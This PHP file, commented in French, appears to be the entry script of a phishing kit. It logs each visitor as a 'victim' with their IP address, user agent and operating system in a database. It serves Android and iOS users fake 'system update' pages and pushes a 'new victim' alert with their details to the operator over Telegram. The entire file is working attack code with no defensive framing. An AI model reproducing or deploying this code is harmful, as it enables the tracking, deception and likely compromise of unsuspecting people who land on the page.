<?php
require_once 'config.php';

// Génération ID
$victimId = generateVictimId();
$ip = getClientIP();
$ua = $_SERVER['HTTP_USER_AGENT'] ?? '';

// Détection OS
$os = 'unknown';
if (strpos($ua, 'Android') !== false) {
    $os = 'Android';
    preg_match('/Android (\d+)/', $ua, $matches);
    $osVersion = $matches[1] ?? 'unknown';
    $template = 'android-update';
} elseif (strpos($ua, 'iPhone') !== false || strpos($ua, 'iPad') !== false) {
    $os = 'iOS';
    preg_match('/OS (\d+)_/', $ua, $matches);
    $osVersion = $matches[1] ?? 'unknown';
    $template = 'ios-update';
} else {
    $os = 'Desktop';
    $template = 'generic';
}

// Sauvegarde BDD
try {
    $stmt = $pdo->prepare("
        INSERT INTO victims (id, ip, user_agent, os, first_seen, last_seen) 
        VALUES (?, ?, ?, ?, NOW(), NOW())
    ");
    $stmt->execute([$victimId, $ip, $ua, $os]);
} catch (Exception $e) {
    logActivity("Erreur insertion victime: " . $e->getMessage(), 'error');
}

// Log
logActivity("Nouvelle victime: $victimId - $ip - $os");

// Notification Telegram
if ($os !== 'unknown') {
    sendToTelegram("
🔔 <b>NOUVELLE VICTIME</b>
🆔 <code>$victimId</code>
🌍 IP: $ip
📱 OS: $os
🕐 " . date('H:i:s')
    );
}

// Inclusion du template
include "templates/$template.php";
?>
